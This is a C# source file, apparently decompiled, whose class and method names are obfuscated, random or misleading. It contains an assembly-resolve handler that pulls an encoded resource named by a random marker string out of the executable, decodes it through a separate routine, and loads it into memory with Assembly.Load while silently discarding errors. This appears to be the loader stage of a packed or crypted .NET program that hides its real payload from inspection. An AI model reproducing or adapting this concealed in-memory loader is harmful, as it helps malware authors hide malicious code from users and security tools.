using System;
using System.IO;
using System.Linq;
using System.Reflection;
using Stihcpdaboumyasclt.Roles;

namespace Stihcpdaboumyasclt.Classes;

public sealed class UtilsComparatorClass
{
	[Serializable]
	private sealed class Parser
	{
		public static readonly Parser _Page = new Parser();

		public static Func<string, bool> m_Collection;

		internal bool ConnectInitializer(string i)
		{
			return i.Contains("Leqebkelbvqlfcub");
		}
	}

	private sealed class StateDatabaseID
	{
		public ResolveEventArgs m_Reponse;

		internal bool SetInitializer(Assembly init)
		{
			return init.FullName == m_Reponse.Name;
		}
	}

	private string _Dic;

	private string m_Reader;

	private string m_Exporter;

	private string ForgotInitializer()
	{
		return _Dic;
	}

	private void DisableInitializer(string init)
	{
		_Dic = init;
	}

	private string ListInitializer()
	{
		return m_Reader;
	}

	private void CancelInitializer(string config)
	{
		m_Reader = config;
	}

	private string ReflectInitializer()
	{
		return m_Exporter;
	}

	private void ResolveInitializer(string var1)
	{
		m_Exporter = var1;
	}

	public Assembly CalculateInitializer(object var1, ResolveEventArgs visitor)
	{
		StateDatabaseID stateDatabaseID = new StateDatabaseID();
		stateDatabaseID.m_Reponse = visitor;
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(stateDatabaseID.SetInitializer);
			if (assembly != null)
			{
				return assembly;
			}
			if (stateDatabaseID.m_Reponse.Name.Contains("Leqebkelbvqlfcub"))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				ResolveInitializer(executingAssembly.GetManifestResourceNames().SingleOrDefault(Parser._Page.ConnectInitializer) ?? "");
				Stream? manifestResourceStream = executingAssembly.GetManifestResourceStream(ReflectInitializer());
				MemoryStream memoryStream = new MemoryStream();
				manifestResourceStream!.CopyTo(memoryStream);
				byte[] i = memoryStream.ToArray();
				return Assembly.Load(new Token().AwakeInitializer(i));
			}
		}
		catch
		{
		}
		return null;
	}
}
